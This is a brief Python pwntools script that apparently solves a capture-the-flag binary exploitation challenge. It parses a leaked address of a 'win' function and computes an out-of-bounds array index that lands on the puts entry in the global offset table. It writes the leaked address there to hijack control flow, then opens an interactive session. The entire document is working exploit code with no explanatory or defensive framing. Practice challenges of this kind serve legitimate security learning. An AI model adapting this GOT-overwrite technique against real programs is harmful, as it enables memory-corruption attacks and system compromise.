#!/bin/python

import sys
from pwn import * 

PROGRAM=sys.argv[1]
ARR_OFFSET=0x176

elf = ELF(PROGRAM)

proc = process(PROGRAM)
proc.readuntil(b"win is located at: 0x")
leak = int(proc.readline(), 16) + 20

print(f"{hex(leak)}; puts: {elf.got['puts']}")

idx = (elf.got['puts'] - elf.symbols['bssdata']) // 8 - ARR_OFFSET 
print(f"Idx: " + str(idx))

proc.sendline(str(idx).encode())
proc.sendline(str(leak).encode())

proc.interactive()
